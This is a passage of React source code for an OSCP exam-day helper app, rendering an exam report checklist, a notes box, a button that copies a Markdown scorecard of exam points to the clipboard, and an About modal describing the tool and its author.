              </div>
              <div style={{ background: "#060a0e", border: "1px solid #1e2838", borderRadius: 4, padding: 16, fontSize: 12, lineHeight: 2.2, color: "#6a7a8a" }}>
                <div>✦ Machines graded in <span style={{ color: "#e53e3e" }}>report order</span> — order your best work first</div>
                <div>✦ For each machine: nmap output, service enum, exploit steps, screenshots, proof</div>
                <div>✦ Modified exploit: include your modified code inline in PDF</div>
                <div>✦ Unmodified exploit: include EDB-ID / URL only — no full code paste</div>
                <div>✦ All scripts/PoCs as <span style={{ color: "#cdd6e0" }}>text inside the PDF</span> — not attachments</div>
                <div>✦ Export as PDF → archive: <code style={{ color: "#7ecb9e" }}>7z a OSCP-{osid || "OS-XXXXX"}-Exam-Report.7z OSCP-{osid || "OS-XXXXX"}-Exam-Report.pdf</code></div>
                <div>✦ No password on the archive</div>
                <div>✦ Max 200MB</div>
                <div>✦ Upload to: <span style={{ color: "#3b9eff" }}>https://upload.offsec.com</span></div>
                <div>✦ Filename is <span style={{ color: "#e53e3e" }}>case-sensitive</span></div>
              </div>
            </div>

            {/* Notes scratch */}
            <div style={{ marginBottom: 24 }}>
              <div style={{ fontSize: 11, letterSpacing: 3, color: "#3a4858", textTransform: "uppercase", marginBottom: 6 }}>
                Exam Notes
              </div>
              <textarea
                value={examNotes}
                onChange={e => setExamNotes(e.target.value)}
                placeholder="IPs, creds found, rabbit holes, time log..."
                style={{
                  background: "#060a0e", border: "1px solid #1e2838", color: "#7ecb9e",
                  padding: "10px 12px", fontFamily: "inherit", fontSize: 13, borderRadius: 2,
                  width: "100%", minHeight: 80, resize: "vertical", boxSizing: "border-box",
                  lineHeight: 1.6,
                }}
              />
            </div>

            {/* Copy Obsidian scorecard */}
            <div style={{ display: "flex", gap: 12, alignItems: "center" }}>
              <button
                onClick={() => {
                  const now = new Date();
                  const ts = now.toISOString().slice(0,10) + ' ' + now.toTimeString().slice(0,5);
                  const lines = [];
                  lines.push('---');
                  lines.push(`title: "OSCP Exam Scorecard"`);
                  lines.push(`osid: "${osid}"`);
                  lines.push(`date: ${ts}`);
                  lines.push(`score: ${calcScore()}`);
                  lines.push(`tags: ["exam", "oscp", "scorecard"]`);
                  lines.push('---');
                  lines.push('');
                  lines.push('# OSCP Exam Scorecard');
                  lines.push(`> ${ts} · Score: **${calcScore()} / 100** · Pass threshold: 70`);
                  lines.push('');
                  if (osid) {
                    lines.push(`**OSID:** ${osid}`);
                    lines.push(`**Report filename:** OSCP-${osid}-Exam-Report.pdf → OSCP-${osid}-Exam-Report.7z`);
                    lines.push('');
                  }
                  lines.push('## Score Tracker');
                  lines.push('');
                  lines.push('### Active Directory (40pts — DC must be owned for any AD points)');
                  lines.push('| Machine | local.txt | proof.txt | Points |');
                  lines.push('|---------|-----------|-----------|--------|');
                  const { ad1, ad2, adc } = machines;
                  const adScores = adc.proof ? { ad1: ad1.local ? 10 : 0, ad2: ad2.local ? 10 : 0, adc: 20 } : { ad1: 0, ad2: 0, adc: 0 };
                  lines.push(`| AD Machine 1 | ${ad1.local ? '✅' : '⬜'} | — | ${adScores.ad1} |`);
                  lines.push(`| AD Machine 2 | ${ad2.local ? '✅' : '⬜'} | — | ${adScores.ad2} |`);
                  lines.push(`| Domain Controller | — | ${adc.proof ? '✅' : '⬜'} | ${adScores.adc} |`);
                  lines.push('');
                  lines.push('### Standalones (60pts)');
                  lines.push('| Machine | local.txt (+10) | proof.txt (+10) | Points |');
                  lines.push('|---------|-----------------|-----------------|--------|');
                  ['sa1','sa2','sa3'].forEach(key => {
                    const m = machines[key];
                    const pts = (m.local ? 10 : 0) + (m.proof ? 10 : 0);
                    lines.push(`| ${m.name} | ${m.local ? '✅' : '⬜'} | ${m.proof ? '✅' : '⬜'} | ${pts} |`);
                  });
                  lines.push('');
                  lines.push(`**Total: ${calcScore()} / 100** ${calcScore() >= 70 ? '🟢 PASSING' : calcScore() >= 50 ? '🟡 NOT YET' : '🔴 BELOW THRESHOLD'}`);
                  lines.push('');
                  if (metasploitUsed) {
                    lines.push(`## Metasploit`);
                    lines.push(`> ⚠ Locked to: **${metasploitUsed}** — do not use on any other machine`);
                    lines.push('');
                  }
                  lines.push('## Proof Capture Checklist');
                  lines.push('- [ ] Linux: `cat /root/proof.txt` + `ip addr` same screenshot, root shell, interactive');
                  lines.push('- [ ] Windows: `type proof.txt` + `ipconfig` same screenshot, SYSTEM/Admin, interactive');
                  lines.push('- [ ] All flags submitted to control panel before exam ends');
                  lines.push('');
                  lines.push('## Report Checklist');
                  lines.push('- [ ] Machines ordered best-first in report');
                  lines.push('- [ ] Each machine: nmap, enum, exploit steps, screenshots, proof');
                  lines.push('- [ ] Modified exploits: code inline in PDF');
                  lines.push('- [ ] Unmodified exploits: EDB-ID / URL only');
                  lines.push('- [ ] All scripts as text inside PDF (not attachments)');
                  lines.push(`- [ ] Export PDF → 7z a OSCP-${osid || 'OS-XXXXX'}-Exam-Report.7z OSCP-${osid || 'OS-XXXXX'}-Exam-Report.pdf`);
                  lines.push('- [ ] No password on archive · Max 200MB');
                  lines.push('- [ ] Upload to https://upload.offsec.com');
                  lines.push('- [ ] Filename case-sensitive — verify before upload');
                  lines.push('');
                  if (examNotes) {
                    lines.push('## Notes');
                    lines.push(examNotes);
                    lines.push('');
                  }
                  lines.push('---');
                  lines.push('*The Path — OSCP Field Guide*');
                  navigator.clipboard.writeText(lines.join('\n'));
                }}
                style={{
                  background: "transparent",
                  border: "1px solid #7c3aed55",
                  color: "#a78bfa",
                  padding: "7px 18px",
                  cursor: "pointer",
                  fontFamily: "inherit",
                  fontSize: 13,
                  letterSpacing: 2,
                  borderRadius: 2,
                  textTransform: "uppercase",
                }}
                onMouseEnter={e => e.currentTarget.style.borderColor = "#7c3aed99"}
                onMouseLeave={e => e.currentTarget.style.borderColor = "#7c3aed55"}
              >
                ⟡ copy scorecard to obsidian
              </button>
              <button
                onClick={() => setShowReport(false)}
                style={{
                  background: "transparent",
                  border: "1px solid #1e2838",
                  color: "#3a4858",
                  padding: "7px 18px",
                  cursor: "pointer",
                  fontFamily: "inherit",
                  fontSize: 13,
                  letterSpacing: 2,
                  borderRadius: 2,
                  textTransform: "uppercase",
                }}
              >
                esc close
              </button>
            </div>

            <div style={{ marginTop: 16, fontSize: 10, color: "#1e2838", letterSpacing: 1 }}>
              Press E to open · ESC to close · State resets on page refresh · Not affiliated with OffSec
            </div>
          </div>
        </div>
      )}

      {/* ── ABOUT MODAL ────────────────────── */}
      {showAbout && (
        <div
          onClick={() => setShowAbout(false)}
          style={{
            position: "fixed",
            inset: 0,
            background: "rgba(0,0,0,0.85)",
            zIndex: 100,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            padding: 24,
          }}
        >
          <div
            onClick={e => e.stopPropagation()}
            style={{
              background: "#0c1018",
              border: "1px solid #3b9eff33",
              borderRadius: 8,
              padding: "36px 40px",
              maxWidth: 560,
              width: "100%",
              fontFamily: "inherit",
              boxShadow: "0 0 80px #3b9eff18",
            }}
          >
            <div style={{ fontSize: 22, fontWeight: 800, letterSpacing: 4, color: "#3b9eff", marginBottom: 6, textTransform: "uppercase" }}>
              The Path
            </div>
            <div style={{ fontSize: 12, letterSpacing: 3, color: "#3a4858", textTransform: "uppercase", marginBottom: 24 }}>
              OSCP Field Guide
            </div>
            <p style={{ color: "#6a7a8a", lineHeight: 1.8, fontSize: 14, marginBottom: 16 }}>
              An interactive decision-tree methodology for OSCP exam day and offensive security practice.
              148 nodes covering every attack domain — web, AD, Linux, Windows, pivoting, shells,
              documentation, and the inner game of operating under pressure.
            </p>
            <p style={{ color: "#6a7a8a", lineHeight: 1.8, fontSize: 14, marginBottom: 24 }}>
              Built for practitioners who need a tool that thinks with them — not just a cheatsheet,
              but a guide that makes decisions, surfaces failure modes, and keeps you oriented
              when the clock is running.
            </p>
            <div style={{ borderTop: "1px solid #1e2838", paddingTop: 20, display: "flex", flexDirection: "column", gap: 8 }}>
              <div style={{ fontSize: 13, color: "#4a5568" }}>
                Built by <span style={{ color: "#cdd6e0" }}>Braxton Bailey</span> <span style={{ color: "#3a4858" }}>(jimi421)</span> — Security practitioner, perpetual student.
              </div>
              <div style={{ display: "flex", gap: 12, marginTop: 8 }}>
                <a href="https://github.com/jimi421/patha" target="_blank" rel="noopener noreferrer"
                  style={{ color: "#3b9eff", fontSize: 13, letterSpacing: 2, textDecoration: "none", textTransform: "uppercase", border: "1px solid #3b9eff33", padding: "4px 12px", borderRadius: 2 }}>
                  ⎇ GitHub
                </a>
                <a href="https://www.linkedin.com/in/braxtonb-dev" target="_blank" rel="noopener noreferrer"
                  style={{ color: "#3b9eff", fontSize: 13, letterSpacing: 2, textDecoration: "none", textTransform: "uppercase", border: "1px solid #3b9eff33", padding: "4px 12px", borderRadius: 2 }}>
                  LinkedIn
                </a>
              </div>
            </div>
            <button
              onClick={() => setShowAbout(false)}
              style={{
                position: "absolute",
                display: "none",
              }}
            />
            <div style={{ marginTop: 20, fontSize: 11, color: "#2a3848", letterSpacing: 1 }}>
              Press ESC to close · Not affiliated with OffSec
            </div>
          </div>
        </div>
      )}

      <style>{`
        @keyframes fadeSlide {
          from { opacity: 0; transform: translateY(8px); }
          to   { opacity: 1; transform: translateY(0); }
        }
        * { box-sizing: border-box; }
        ::-webkit-scrollbar { width: 4px; height: 4px; }
        ::-webkit-scrollbar-track { background: #080b0f; }
        ::-webkit-scrollbar-thumb { background: #1e2838; border-radius: 2px; }
        button:focus { outline: none; }
        pre { scrollbar-width: thin; scrollbar-color: #1e2838 #060a0e; }
      `}</style>
    </div>
  );
}
